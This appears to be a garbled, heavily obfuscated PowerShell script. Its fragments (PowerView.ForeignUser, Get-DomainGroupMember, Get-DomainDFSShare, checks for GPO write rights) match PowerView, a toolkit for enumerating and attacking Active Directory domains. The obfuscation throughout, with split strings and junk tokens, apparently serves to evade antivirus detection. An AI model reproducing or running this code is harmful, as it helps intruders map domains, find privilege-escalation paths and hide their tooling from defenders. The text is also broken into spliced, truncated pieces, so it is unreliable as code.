            if(YoV{OBjIJKeCIJKTIJKType} -eq YoV{nIJKUlL} -and YoV{iIJKNHeRIIJKTIJKANcIJKEtYPE} -eq  ( &(Z3b{2}{1}{0}Z3b-fS5zEMS5z,S5zeT-ITS5z,S5zgS5z) VaRiaBLe:QpU29 ).Z3bVALIJKUEZ3b::Z3bemIJKPtyZ3b -and YoV{inhERIJKItIJKEDobJIJKEctTIJKyIJKpe} -eq YoV{nUIJKlL}) {
                &(Z3b{0}{2}{1}Z3b-f S5zNewS5z,S5zbjectS5z,S5z-OS5z) (Z3b{0}{10}{3}{4}{5}{2}{1}{7}{9}{6}{8}Z3b -f S5zSystem.S5z,S5zctS5z,S5ze','NIJKTInuE}) {
                    YoV{FILeIJKParIJKAIJKMs} = @{
                        (Z3b{0}{1}Z3b -f S5zPatS5z,S5zhS5z) = YoV{_}.Z3bFUlLnaIJKMeZ3b
                        (Z3b{1}{0}Z3b -fS5znerS5z,S5zOwS5z) = YoV((&(Z3b{1}{2}{0}Z3b -fS5z-AclS5z,S5zGeS5z,S5ztS5z) YoV{_}.Z3bFUllnAIJKmeZ3b).Z3boIJKWNErZ3b)
                        (Z3b{2}{0}{1}Z3b-f S5zTS5z,S5zimeS5z,S5zLastAccessS5z) = YoV{_}.Z3bLAStaCCeIJKSStIIJKMeZ3b
                        (Z3b{2}{0}{3}{1}Z3b-fS5ztWriS5z,S5zmeS5z,S5zLasS5z,S5zteTiS5z) = YoV{_}.Z3blIJKAsIJKTwRiTeTiMeZ3b
                        (Z3b{2}{3}{1}{0}Z3b -fS5znTimeS5z,S5zoS5z,S5zCreatS5z,S5ziS5z) = YoV{_}.Z3bCReIJKATIIJKONTIMeZ3b
                        (Z3b{1}{0}Z3b -f S5zengthS5z,S5zLS5z) = YoV{_}.Z3blIJKengThZ3b
                    }
                    YoV{fIJKoUIJKNDfiLE} = &(Z3b{2}{0}{1}{3}Z3b-f S5zeS5z,S5zcS5z,S5zNew-ObjS5z,S5ztS5z) -TypeName (Z3b{1}{0}Z3b -fS5zectS5z,S5zPSObjS5z) -Property YoV{FIIJKLIJKEIJKParAMS}
                    YoV{FoUIJKNdfIJKiLE}.Z3bPSIJKoIJKBJectZ3b.Z3bTYPeIJKNAmIJKEsZ3b.(Z3b{1}{0}Z3b -fS5zrtS5z,S5zInseS5z).Invoke(0, (Z3b{1}{0}{3}{4}{2}{5}Z3b -f S5zerS5z,S5zPowS5z,S5zFS5z,S5zVieS5z,S5zw.FoundS5z,S5zileS5z))
                    YoV{fOUnIJKdIJKFIIJKLe}
                }
            }
        }
    }

    END {
        
        YoV{MIJKAPpEDcIJKoMIJKpUTERs}.Z3bkIJKEYSZ3b JGO &(Z3b{3}{0}{6}{1}{4}{2}{5}Z3b-f S5zmoveS5z,S5zeS5z,S5znnectiS5z,S5zReS5z,S5zmoteCoS5z,S5zonS5z,S5z-RS5z)
    }
}








function NEIJKw-IJKTHIJKReIJKAdEDfuIJKNCIJKTIon {
    
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{12}{0}{4}{2}{6}{5}{8}{10}{9}{1}{7}{11}{3}Z3b -f S5zSUseS5z,S5znS5z,S5zPS5z,S5ztio','EmPIJKTyZ3b
    )

    BEGIN {
        if (YoV{pSIJK',',S5zCaS5z,S5zllingCoS5z,S5zoS5z))
            YoV{chaRSIJKeTFiIJKEIJKlD} = YoV{dIJKlIJKliMpORT}.(Z3b{1}{0}Z3b -f S5zeldS5z,S5zGetFiS5z).Invoke((Z3b{1}{2}{0}Z3b -f S5zrSetS5z,S5zChS5z,S5zaS5z))
            YoV{EnTrIJKYpIJKoiNTfieIJKLd} = YoV{dllIJKIIJKMpOIJKRT}.(Z3b{0}{2}{1}Z3b -f S5zGetS5z,S5zdS5z,S5zFielS5z).Invoke((Z3b{0}{2}{1}Z3b -f S5zEntrS5z,S5ztS5z,S5zyPoinS5z))
            if (YoV{sIJKEtLIJKAsTerRor}) { YoV{SIJKLevIJKAIJKLue} = YoV{tIJKRue} } else { YoV{sLeIJKVAlUE} = YoV{FalIJKsE} }

            if (YoV{pSbOUNdIJKpaRIJKAIJKMIJKeters}[(Z3b{1}{0}{2}Z3b -fS5zntryPS5z,S5zES5z,S5zointS5z)]) { YoV{EXPOIJKRtIJKedfIJKUNIJKcNaMe} = YoV{EnTIJKRYPOIJKINt} } else { YoV{exporTeDFuncIJKNIJKAIJKmE} = YoV{FUIJKNCTIIJKOnIJKName} }

            
            YoV{CIJKOnIJKsTrUCtIJKor} =   YoV{z7IJKsIJKXo}.Z3bGetcoIJKNIJKSIJKTIJKRuCtorZ3b([String])
            YoV{dIJKlLiMpIJKorIJKTATTRIBUTE} = &(Z3b{2}{0}{1}Z3b-fS5z-ObS5z,S5zjectS5z,S5zNewS5z) (Z3b{1}{6}{5}{4}{2}{0}{3}Z3b-f S5zldeS5z,S5zReflection.Emit.S5z,S5ztributeBuiS5z,S5zrS5z,S5zomAtS5z,S5zus',')]) { YoV{nIJKETfoReSTIJKArgIJKUMeNtS}[(Z3b{2}{0}{1}Z3b-f S5zoresS5z,S5ztS5z,S5zFS5z)] = YoV{FoIJKReIJKst} }
        if (YoV{PSIJKBOunIJKDPaIJKRaIJKMeteRS}[(Z3b{1}{0}{2}Z3b -f S5zenS5z,S5zCredS5z,S5ztialS5z)]) { YoV{NIJKETfIJKOReIJKSTAIJKRguIJKments}[(Z3b{0}{1}{2}Z3b -fS5zCrS5z,S5zedentiS5z,S5zalS5z)] = YoV{CIJKRedeIJKNTIaL} }

        YoV{FoIJKUIJKNDfOreSt} = &(Z3b{2}{1}{0}Z3b-fS5zrestS5z,S5zet-FoS5z,S5zGS5z) @NetForestArguments

       ','pty()]
        [String]
        YoV{DIJKOIJKMAin},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{crEdEIJKNTiIJKAL} =  YoV{jIJKFi}::Z3bEmIJKpTyZ3b
    )

    BEGIN {
        YoV{cONteIJKxtargIJKUMEIJKNts} = @{
            (Z3b{0}{1}Z3b-fS5zIdenS5z,S5ztityS5z) = YoV{iDIJKEntiTy}
        }
        if (YoV{pSIJKBOunIJKDIJKparAMIJKETIJKerS}[(Z3b{0}{1}{2}Z3b -fS5zDoS5z,S5zmaS5z,S5zinS5z)]) { YoV{COnteIJKXIJKTARIJKgUMeIJKNts}[(Z3b{2}{1}{0}Z3b -f S5znS5z,S5ziS5z,S5zDomaS5z)] = YoV{DoIJKmIJKAin} }
        if (YoV{PsboUNDPIJKARAMIJKeteIJKRs}[(Z3b{2}{0}{1}Z3b-f S5zdentiS5z,S5zalS5z,S5zCreS5z)]) { YoV{CIJKONTIJKEXTAIJKRGUMIJKeNTS}[(Z3b{1}{0}{2}Z3b -fS5zedS5z,S5zCrS5z,S5zentialS5z)] = YoV{cReDEIJKNIJKTiIJKAl} }

        YoV{gRoupIJKCoNIJKText} = &(Z3b{2}{3}{5}{4}{0}{1}Z3b -fS5zContexS5z,S5ztS5z,S5zGS5z,S5zeS5z,S5zPrincipalS5z,S5zt-S5z) @ContextArguments

        if (YoV{gRIJKoUIJKPCIJKOnTExT}) {
            try {
                YoV{gIJKROIJKUp} = [System.DirectoryServices.AccountManagement.GroupPrincipal]::(Z3b{2}{0}{1}{3}Z3b -f S5zndByIdenS5z,S5ztitS5z,S5zFiS5z,S5zyS5z).Invoke(YoV{GIJKROuIJKPCOIJKNTeIJKxt}.Z3bcoNTeIJKXtZ3b, YoV{gIJKROIJKUPcOIJKNtExT}.Z3bIdenTIJKItYZ3b)
            }
            catch {
                &(','5ztNS5z) YoV{objEIJKcT}.Z3bSAMIJKAcCoIJKUnTNAMeZ3b
                    YoV{gPoIJKLIJKOCAlgrouIJKPIJKmAppinG} JGO &(Z3b{2}{0}{1}Z3b -fS5zdd-MembeS5z,S5zrS5z,S5zAS5z) (Z3b{1}{2}{0}Z3b-f S5zrtyS5z,S5zNoteprS5z,S5zopeS5z) (Z3b{0}{1}Z3b-f S5zObjectDS5z,S5zNS5z) YoV{oIJKBIJKJeCt}.Z3bDIJKISTIIJKNgUiIJKSheIJKdIJKNaMeZ3b
                    YoV{GPoLOcAlgIJKRoI','        YoV{forEiIJKGIJKNUsIJKer} JGO &(Z3b{2}{1}{0}Z3b -f S5zberS5z,S5zmS5z,S5zAdd-MeS5z) (Z3b{0}{2}{1}Z3b-f S5zNotepS5z,S5ztyS5z,S5zroperS5z) (Z3b{0}{2}{1}Z3b-f S5zUS5z,S5zeS5z,S5zserNamS5z) YoV{_}.Z3bsAMIJKAcCIJKOUIJKNTnIJKAMEZ3b
                        YoV{fOrEIJKiIJKgnUSER} JGO &(Z3b{1}{0}{2}Z3b -fS5zeS5z,S5zAdd-MembS5z,S5zrS5z) (Z3b{2}{1}{0}Z3b-fS5zyS5z,S5zpertS5z,S5zNoteproS5z) (Z3b{4}{3}{1}{2}{0}Z3b -fS5zeS5z,S5zsheS5z,S5zdNamS5z,S5zuiS5z,S5zUserDistingS5z) YoV{_}.Z3bdIstIIJKNIJKguIJKIsIJKhEdIJKNAmeZ3b
                        YoV{FIJKOREiGIJKNUseR} JGO &(Z3b{2}{3}{1}{0}Z3b-fS5zemberS5z,S5zMS5z,S5zAdS5z,S5zd-S5z) (Z3b{1}{2}{3}{0}Z3b -f S5zertyS5z,S5zNotS5z,S5zeprS5z,S5zopS5z) (Z3b{0}{2}{3}{1}Z3b -f S5zGroupDoS5z,S5zinS5z,S5zmS5z,S5zaS5z) YoV{groUPIJKdIJKoIJKmaiN}
                        YoV{foREIJKignIJKUSeR} JGO &(Z3b{2}{0}{1}Z3b -f S5zMembS5z,S5zerS5z,S5zAdd-S5z) (Z3b{2}{0}{1}Z3b-f S5zepropS5z,S5zertyS5z,S5zNotS5z) (Z3b{0}{1}Z3b -fS5zGroS5z,S5zupNameS5z) YoV{GrOUpIJKNIJKAIJKmE}
                        YoV{fIJKOREIJKIgnuIJKsEr} JGO &(Z3b{2}{3}{1}{0}Z3b-fS5zrS5z,S5z-MembeS5z,S5zAS5z,S5zddS5z) (Z3b{3}{2}{1}{0}Z3b -f S5zrtyS5z,S5ztepropeS5z,S5zoS5z,S5zNS5z) (Z3b{3}{2}{0}{1}Z3b-fS5zguisS5z,S5zhedNameS5z,S5znS5z,S5zGroupDistiS5z) YoV{mIJKemIJKBERIJKSHiP}
                        YoV{FoREIJKiIJKgNUser}.Z3bpSObjIJKeIJKCtZ3b.Z3bTIJKyPENaMIJKEsZ3b.(Z3b{2}{1}{0}Z3b -fS5ztS5z,S5zrS5z,S5zInseS5z).Invoke(0, (Z3b{3}{0}{1}{4}{2}{5}Z3b-f S5zowerS5z,S5zVieS5z,S5zeiS5z,S5zPS5z,S5zw.ForS5z,S5zgnUserS5z))
                        YoV{FoReIGIJKNUsIJKEr}
                    }
                }
            }
        }
    }
}


function get-DoIJKmIJKAIJKiNfoReIJKIGNGRouPmEMbIJKeR {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{3}{2}{1}{0}Z3b -fS5zcessS5z,S5zProS5z,S5zShouldS5z,S5zPSS5z}, S5zS5z)]
    [OutputType({Z3b{1}{6}{5}{2}{7}{3}{4}{0}Z3b -f S5zemberS5z,S5zPS5z,S5zreignS5z,S5zupS5z,S5zMS5z,S5zFoS5z,S5zowerView.S5z,S5zGroS5z})]
    [CmdletBinding()]
    Param(
        [Parameter(pOSiTiON = 0, vaLUefRompiPeline = YoV{TIJKRUE}, valuefroMpIPeliNebypRoPeRtynAME = YoV{TrIJKUe})]
        [Alias({Z3b{1}{0}Z3b-f S5zameS5z,S5zNS5z})]
        [ValidateNotNullOrEmpty()]
        [String]
        YoV{DoIJKmAiN},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{1}{2}{0}Z3b -fS5zerS5z,S5zFilS5z,S5ztS5z})]
        [String]
        YoV{lIJKDAIJKPFiltER},

        [ValidateNotNullOrEmpty()]
        [String[]]','     [String]
        YoV{DOmIJKAIn},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{0}{1}Z3b-f S5zFilS5z,S5zterS5z})]
        [String]
        YoV{lDIJKAPIJKFilTIJKER},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{1}{0}Z3b -f S5zhS5z,S5zADSPatS5z})]
        [String]
        YoV{sIJKeAIJKRCHBaSe},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{1}{4}{3}{0}{2}Z3b-fS5ztrollS5z,S5zDoS5z,S5zerS5z,S5zainConS5z,S5zmS5z})]
        [String]
        YoV{seIJKRvEr},

        [ValidateSet({Z3b{1}{0}Z3b -fS5zeS5z,S5zBasS5z}, {Z3b{0}{1}{2}Z3b-f S5zOS5z,S5zneLeveS5z,S5zlS5z}, {Z3b{1}{2}{0}Z3b -f S5zeeS5z,S5zSS5z,S5zubtrS5z})]
        [String]
        YoV{SIJKeARcIJKHsIJKcopE} = (Z3b{1}{2}{0}Z3b-f S5zeS5z,S5zSuS5z,S5zbtreS5z),

        [Valida','-fS5zeS5z,S5zerbosS5z,S5zWriS5z,S5zte-VS5z) (S5z[GeS5z+S5ztS5z+S5z-DomaS5z+S5zinGroupMS5z+S5zembeS5z+S5zr] S5z+S5zExtS5z+S5zractedS5z+S5z S5z+S5zdoS5z+S5zmaiS5z+S5zn S5z+Z3bS5zYoVIdentityDomainS5z Z3b+S5zfromS5z+S5z S5z+Z3bS5zYoVIdentityInstanceS5zZ3b)
                            YoV{seArchERIJKAIJKRIJKgumENtS}[(Z3b{1}{2}{0}Z3b-f S5zinS5z,S5zDomS5z,S5zaS5z)] = YoV{iIJKdEIJKNIJKTitYDOMAiN}
                            YoV{GRIJKOUpIJKseArIJKCHeR} = &(Z3b{3}{4}{2}{0}{1}Z3b-f S5zinSS5z,S5zearcherS5z,S5zaS5z,S5zGet-DoS5z,S5zmS5z) @SearcherArguments
                            if (-not YoV{GROuIJKpsIJKeAIJKRCIJKHEr}) {
                                &(Z3b{0}{2}{1}Z3b -fS5zWriS5z,S5zgS5z,S5zte-WarninS5z) (S5z[GS5z+S5zet-DomaS5z+S5zinS5z+S5zGroS5z+S5zupMembS5z+S5zerS5z+S5z] S5z+S5zUnS5z+S5zable S5z+S5ztS5z+S5zo S5z+S5zretrieS5z+S5zveS5z+S5z S5z+S5zdomS5z+S5zain S5z+S5zsearcS5z+S5zhS5z+S5zerS5z+S5z S5z+S5zfS5z+S5zor S5z+Z3bS5zYoVIdentityDomainS5zZ3b)
                            }
                        }
                    }
                    else','AS5z,S5zrS5z)] = YoV{cIJKoIJKmPUtIJKeIJKRIJKLDapFILTer} }
        if (YoV{PsbIJKoIJKUnDIJKpARIJKAMEtEIJKRS}[(Z3b{3}{2}{0}{1}Z3b -f S5zeaS5z,S5zrchBaseS5z,S5zSS5z,S5zComputerS5z)]) { YoV{coIJKmPUIJKTERseIJKARchIJKERaRGUmEnts}[(Z3b{1}{0}{2}Z3b-f S5zarcS5z,S5zSeS5z,S5zhBaseS5z)] = YoV{cOIJKMpIJKUtErSIJKearcHIJKBASe} }
        if (YoV{PSIJKBoIJKUNDParAMIJKETErS}[(Z3b{1}{2}{3}{0}Z3b -fS5zainedS5z,S5zUS5z,S5znconS5z,S5zstrS5z)]) { YoV{cOmPUIJKTErIJKSEarcIJKHeIJKRaRGUIJKmEnIJKTs}[(Z3b{2}{3}{0}{1}Z3b -fS5zainS5z,S5zedS5z,S5zUnconstS5z,S5zrS5z)] = YoV{UnCOIJKNsIJKTIJKRaINed} }
        if (YoV{pSbIJKOIJKUNdPaIJKRaMEIJKTEIJKRS}[(Z3b{0}{3}{4}{6}{5}{2}{1}Z3b-fS5zComputS5z,S5zmS5z,S5zeS5z,S5zerOpS5z,S5zeratingS5z,S5ztS5z,S5zSysS5z)]) { YoV{cIJKOIJKMPIJKUIJKTIJKERSEARCIJKHErARguMENIJKTS}[(Z3b{2}{0}{1}Z3b-f S5zSysteS5z,S5zmS5z,S5zOperatingS5z)] = YoV{oPEraIJKTINgIJKSYstIJKEM} }
        if (YoV{psIJKBIJKOunDPIJKAIJKRamEtEIJKRs}[(Z3b{5}{0}{1}{4}{2}{3}Z3b -f S5zrS5z,S5zSeS5z,S5zviS5z,S5zcePackS5z,S5zrS5z,S5zComputeS5z)]) { YoV{CompuTERSIJKeaRIJKcheIJKRaRIJKGIJKUMenIJKTs}[(Z3b{2}{0}{1}Z3b -fS5zrvicePaS5z,S5zckS5z,S5zSeS5z)] = YoV{sERViCIJKePAIJKck} }
        if (YoV{pSbOUnIJKDPIJKAramETIJKERs}[(Z3b{3}{0}{1}{2}{4}Z3b -f S5zmputS5z,S5zerSiteNS5z,S5zamS5z,S5zCoS5z,S5zeS5z)]) { YoV{CIJKomIJKPUIJKTERSearcherIJKArGUIJKMenTs}[(Z3b{1}{0}Z3b-fS5zmeS5z,S5zSiteNaS5z)] = YoV{sItIJKeIJKNIJKAMe} }
        if (YoV{PsbOIJKUNDIJKPArAIJKmETErS}[(Z3b{0}{1}{2}Z3b-f S5zSerS5z,S5zveS5z,S5zrS5z)]) { YoV{CoIJKmpUIJKTeRSIJKeAIJKRChIJKeRArgUMENIJKTS}[(Z3b{0}{2}{1}Z3b -fS5zSeS5z,S5zerS5z,S5zrvS5z)] = YoV{SIJKEIJKRVEr} }
        if (YoV{pIJKSBIJKoUNDIJKPARamEtIJKeIJKRS}[(Z3b{0}{2}{1}Z3b -fS5zSearS5z,S5zeS5z,S5zchScopS5z)]) { YoV{cOMPUTIJKErIJKseArCHERARgIJKUmenIJKTs}[(Z3b{3}{0}{1}{2}Z3b-fS5zchSS5z,S5zcopS5z,S5zeS5z,S5zSearS5z)] = YoV{sIJKeaIJKRChSCopE} }
        if (YoV{PsbOunIJKdIJKPaIJKRaIJKMeTeIJKRs}[(Z3b{0}{2}{1}Z3b -fS5zRS5z,S5zltPageSizeS5z,S5zesuS5z)]) { YoV{COMpUIJKTIJKERsEaRIJKcIJKhIJKeIJKRaRGuMIJKEnIJKTs}[(Z3b{1}{3}{2}{0}Z3b -f S5zeSizeS5z,S5zResS5z,S5zagS5z,S5zultPS5z)] = YoV{RIJKEIJKSIJKUltPagEIJKsIzE} }
        if (YoV{pSIJKBOuNdIJKPaIJKRAMIJKEterS}[(Z3b{2}{0}{3}{1}Z3b-fS5zverTimeS5z,S5zitS5z,S5zSerS5z,S5zLimS5z)]) { YoV{Co','                      if (YoV{mEIJKmbIJKERsId}) {
                                        YoV{grOIJKUpMIJKeIJKMbERS} += YoV{meMbIJKEIJKRsId}
                                    }
                                    else {
                                        YoV{gIJKRIJKOUPmEMBIJKeRs} += YoV{MeIJKMbEr}
                                    }
                                }
                                else {
                                    YoV{GrOIJKUPMIJKEmBERS} += YoV{meMIJKBIJKER}
                                }
                            }
                        }
                        YoV{MeMbershipvIJKAIJKLIJKUE} =','Ts}[(Z3b{0}{1}{2}Z3b-f S5zReS5z,S5zsuS5z,S5zltPageSizeS5z)] = YoV{rIJKEIJKsuLIJKTPAGEsIze} }
        if (YoV{pIJKsBOUNDIJKpaRAMeTeIJKRs}[(Z3b{1}{2}{4}{0}{3}Z3b-f S5zmS5z,S5zServS5z,S5zerS5z,S5zitS5z,S5zTimeLiS5z)]) { YoV{sEaRIJKchIJKeRIJKArgUMeIJKNIJKTs}[(Z3b{0}{1}{2}{3}Z3b-f S5zSS5z,S5zerS5z,S5zveS5z,S5zrTimeLimitS5z)] = YoV{sIJKErVEIJKRtIMElIMIJKIT} }
        if (YoV{PSbOUIJKNdPAIJKRAMEIJKTerS}[(Z3b{1}{0}{2}Z3b-f S5zstonS5z,S5zTombS5z,S5zeS5z)]) { YoV{SIJKEIJKARIJKcIJKHERArguMeNtS}[(Z3b{2}{1}{0}Z3b -f S5zeS5z,S5ztonS5z,S5zTombsS5z)] = YoV{TOmBIJKstIJKOIJKNE} }
        if (YoV{pIJKSbOuIJKNIJKdIJKpArIJKAMEteRs}[(Z3b{1}{0}{2}Z3b -f S5zenS5z,S5zCredS5z,S5ztialS5z)]) { YoV{seaRcHeraIJKRGIJKUMIJKENtS}[(Z3b{2}{0}{1}{3}Z3b -f S5zeS5z,S5znS5z,S5zCredS5z,S5ztialS5z)] = YoV{CREDEIJKNIJKTiaL} }',')         = YoV{pROpErTIJKiIJKes}[10].Z3bvALIJKUeZ3b
                                (Z3b{3}{2}{0}{1}Z3b -f S5zmS5z,S5zeS5z,S5zsNaS5z,S5zProcesS5z)       = YoV{PIJKROIJKpERTiEs}[11].Z3bVaIJKlUEZ3b
                                (Z3b{2}{0}{1}Z3b-f S5zAddreS5z,S5zssS5z,S5zIpS5z)         = YoV{PrOIJKPeIJKRties}[12].Z3bvIJKAluEZ3b
                                (Z3b{1}{0}Z3b -f S5ztS5z,S5zIpPorS5z)     ','ARES} = @()
                YoV{dIJKFsIJKsearIJKCHER}.Z3bfIJKIlTErZ3b = ((Z3b{7}{1}{0}{4}{3}{6}{2}{5}Z3b-f S5zobjectS5z,S5z(S5z,S5zinkS5z,S5zass=mS5z,S5zClS5z,S5zv2))S5z,S5zsDFS-LS5z,S5z(&S5z))
                YoV{nUIJKlL} = YoV{dFssEaRCIJKHIJKeR}.Z3bproPErIJKTiEsIJKTOLIJKOAdZ3b.(Z3b{2}{1}{0}Z3b -fS5zeS5z,S5zgS5z,S5zAddRanS5z).Invoke(((Z3b{0}{3}{1}{2}Z3b-f S5zmsdfS5z,S5znkS5z,S5zpathv2S5z,S5zs-liS5z),(Z3b{5}{1}{4}{2}{3}{0}Z3b -f S5zv2S5z,S5zFS5z,S5z-TargeS5z,S5ztListS5z,S5zSS5z,S5zmsDS5z)))

                try {
                    YoV{RESIJKUlIJKTs} = YoV{DfsSEIJKArIJKCHeR}.(Z3b{2}{0}{1}Z3b-f S5zindAS5z,S5zllS5z,S5zFS5z).Invoke()
                    YoV{rIJKeIJKsuLTS} JGO &(Z3b{1}{2}{0}Z3b -fS5zbjectS5z,S5zWhere-S5z,S5zOS5z) {YoV{_}} JGO &(Z3b{2}{1}{4}{3}{0}Z3b-fS5zctS5z,S5zhS5z,S5zForEacS5z,S5zObjeS5z,S5z-S5z) {
                        YoV{PrIJKOIJKPeRtIIJKEs} = YoV{_}.Z3bPIJKRoPeIJKRTiIJKEsZ3b
                        YoV{TIJKArGEIJKT_lIST} = YoV{PrOIJKpIJKeRTIEs}.S5zmsdfs-targetlistv2S5z[0]
                        YoV{xIJKMl} = [xml]  (  &(Z3b{0}{1}{2}Z3b -f S5zGES5z,S5zt-VariS5z,S5zABlES5z)  (S5z6S5z+S5zO2ZlPS5z)).Z3bVALIJKUeZ3b::Z3bUIJKNICIJKoDeZ3b.Z3bGIJKEIJKTSTRinGZ3b(YoV{TAIJKRGIJKEIJKT_LISt}[2..(YoV{tArIJKGET_IJKlISt}.Z3bLIJKEnIJKGtHZ3b-1)])
                        YoV{dIJKFSSIJKHIJKAReS} += YoV{XIJKmL}.Z3bTaRGEIJKTSZ3b.Z3bcHIJKIIJKldnIJKODESZ3b JGO &(Z3b{1}{0}{2}{3}Z3b -f S5zrEachS5z,S5zFoS5z,S5z-S5z,S5zObjectS5z) {
                            try {
                                YoV{TaIJKRGIJKEt} = YoV{_}.Z3bINnERIJKTIJKeIJKxtZ3b
                                if ( YoV{tIJKAIJKRgET}.(Z3b{2}{1}{0}Z3b -f S5zainsS5z,S5ztS5z,S5zConS5z).Invoke(S5z5rjS5z) ) {
                                    YoV{DIJKFSRoIJKoT} = YoV{tIJKAIJKRGeT}.(Z3b{1}{0}Z3b-fS5zitS5z,S5zsplS5z).Invoke(S5z5rjS5z)[3]
                                    YoV{sHIJKAreIJKNamE} = YoV{pROIJKpERtIJKiIJKES}.S5zmsdfs-linkpathv2S5z[0]
                                    &(Z3b{0}{1}{2}Z3b-fS5zNewS5z,S5z-ObjecS5z,S5ztS5z) -TypeName (Z3b{0}{2}{1}Z3b-fS5zPS5z,S5zjectS5z,S5zSObS5z) -Property @{(Z3b{0}{1}Z3b-f S5zNaS5z,S5zmeS5z)=Z3bYoVDFSrootYoVShareNameZ3b;(Z3b{2}{4}{3}{0}{1}Z3b-f S5zvS5z,S5zerNameS5z,S5zRemoS5z,S5zSerS5z,S5zteS5z)=YoV{tIJKAIJKRgET}.(Z3b{0}{1}Z3b -fS5zsS5z,S5zplitS5z).Invoke(S5z5rjS5z)[2]}
                                }
                            }
                            catch {
                                &(Z3b{0}{2}{1}{3}Z3b-f S5zWrite-VS5z,S5zsS5z,S5zerboS5z,S5zeS5z) (S5z[S5z+S5zGet-DomaS5z+S5zinS5z+S5zDFSShaS5z+S5zre] S5z+S5zGetS5z+S5z-DS5z+S5zoS5z+S5zmaS5z+S5zinS5z+S5zDFSShareV2S5z+S5z S5z+S5zeS5z+S5zrror S5z+S5ziS5z+S5zn S5z+S5zpaS5z+S5zrsing S5z+S5ztargetS5z+S5z S5z+S5z: S5z+Z3bYoV_Z3b)
                            }
                        }
                    }
                    if (YoV{rIJKESuIJKLtS}) {
                        try { YoV{REsIJKUlTs}.(Z3b{1}{0}Z3b -fS5zoseS5z,S5zdispS5z).Invoke() }
                        catch {
                            &(Z3b{2}{1}{0}{3}Z3b -f S5zrbosS5z,S5ze-VeS5z,S5zWritS5z,S5zeS5z) (S5z[Get-DomaiS5z+S5znDFSSS5z+S5zhS5z+S5zare] S5z+S5zES5z+S5zrroS5z+S5zr S5z+S5zdiS5z+S5zspS5z+S5zosS5z+S5zing S5z+S5zoS5z+S5zf S5z+S5ztS5z+S5zhe S5z+S5zRS5z+S5zesultS5z+S5z','      YoV{lIIJKSTIJKGPO} = YoV{sEARIJKcIJKhEr}.(Z3b{0}{1}{2}Z3b -fS5zFiS5z,S5zndS5z,S5zAllS5z).Invoke()
        foreach (YoV{GIJKpo} in YoV{lIJKisIJKTGPo}){
            YoV{AIJKCl} = ([ADSI]YoV{gIJKpo}.Z3bPIJKAthZ3b).Z3bObIJKjEIJKcIJKTSecURiIJKTyZ3b.Z3bACcIJKesSZ3b JGO &(S5z?S5z) {YoV{_}.Z3bAcTiVedIJKIIJKRectoRYriIJKGHtSZ3b -match (Z3b{1}{0}Z3b -fS5ziteS5z,S5zWrS5z) -and YoV{_}.Z3bacCIJKeIJKSSCIJKOntIJKROIJKlTypEZ3b -eq (Z3b{1}{0}Z3b -fS5zowS5z,S5zAllS5z) -and  YoV{ExCIJKlIJKUSIJKIoNs} -notcontains YoV{_}.Z3biIJKdENtIJKIIJKTyRIJKEfEREnceZ3b.(Z3b{2}{1}{0}Z3b-fS5zgS5z,S5ztrinS5z,S5ztoSS5z).Invoke().(Z3b{0}{1}Z3b-f S5zspliS5z,S5ztS5z).Invoke(Z3b5rjZ3b)[1] -and YoV{_}.Z3biIJKDIJKEIJKNTiTyrEIJKFeREnIJKCEZ3b -ne (Z3b{0}{1}{2}Z3b -f S5zCREATOR OS5z,S5zWNS5z,S5zERS5z)}
        if (YoV{AIJKcl} -ne YoV{NUIJKll}){
            YoV{gIJKpoacL} = &(Z3b{0}{1}{2}{3}Z3b -f S5zNeS5z,S5zw-ObjS5z,S5zeS5z,S5zctS5z) (Z3b{1}{0}{2}Z3b -f S5zbjS5z,S5zpsoS5z,S5zectS5z)','5z,S5zSS5z,S5zervS5z)]) { YoV{doMAIJKinTruSIJKTIJKAIJKRIJKgumEnts}[(Z3b{1}{0}Z3b-fS5zerS5z,S5zServS5z)] = YoV{SERvIJKEr} }
    if (YoV{PsIJKBOuNDPAraMIJKeIJKTERs}[(Z3b{1}{3}{0}{2}Z3b -f S5zpS5z,S5zSS5z,S5zeS','zypeS5z}, S5zS5z)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{0}{2}{4}{5}{8}{3}{9}{1}{6}{7}Z3b-f S5zPSAvS5z,S5zassS5z,S5zoiS5z,S5zlainTextS5z,S5zdUsS5z,S5zingS5z,S5zwS5z,S5zordS5z,S5zPS5z,S5zForPS5z}, S5zS5z)]
    [OutputType({Z3b{3}{6}{4}{1}{2}{0}{5}Z3b-f S5zw.UserPS5z,S5zVS5z,S5zieS5z,S5zPoS5z,S5zerS5z,S5zrocessS5z,S5zwS5z})]
    [CmdletBinding(dEFAuLtparAMETErsETnAMe = {Z3b{0}{1}Z3b-f S5zNS5z,S5zoneS5z})]
    Param(
        [Parameter(PoSITioN = 0, vAlUEFROmpIPElinE = YoV{tIJKRue}, VAlUeFrompIPelineBypRoPErtynAmE = YoV{tRIJKUE})]
        [Alias({Z3b{2}{1}{3}{0}Z3b-fS5zeS5z,S5zostS5z,S5zDNSHS5z,S5zNamS5z})]
        [String[]]
        YoV{CIJKOIJKMIJKPUTERnAME},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{DOIJKMaiN},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{COIJKmPIJKUTerDOIJKMIJKAIn},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{CIJKomIJKpuIJKTERLIJKDAIJKpfilTER},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{cIJKOmPUTeRSEIJKArIJKChIJKBIJKAse},

        [Alias({Z3b{3}{1}{2}{0}Z3b-fS5zinedS5z,S5zoS5z,S5znstraS5z,S5zUncS5z})]
        [Switch]
        YoV{COmIJKpIJKUTeRuNCIJKoIJKNIJKsTraIJKinED},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{2}{0}{1}Z3b -fS5zstS5z,S5zemS5z,S5zOperatingSyS5z})]
        [String]
        YoV{comPuIJKTEROIJKpErAtIIJKNgIJKSYSTEm},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{0}{1}{2}{3}Z3b -fS5zSS5z,S5zervicePaS5z,S5zcS5z,S5zkS5z})]
        [String]
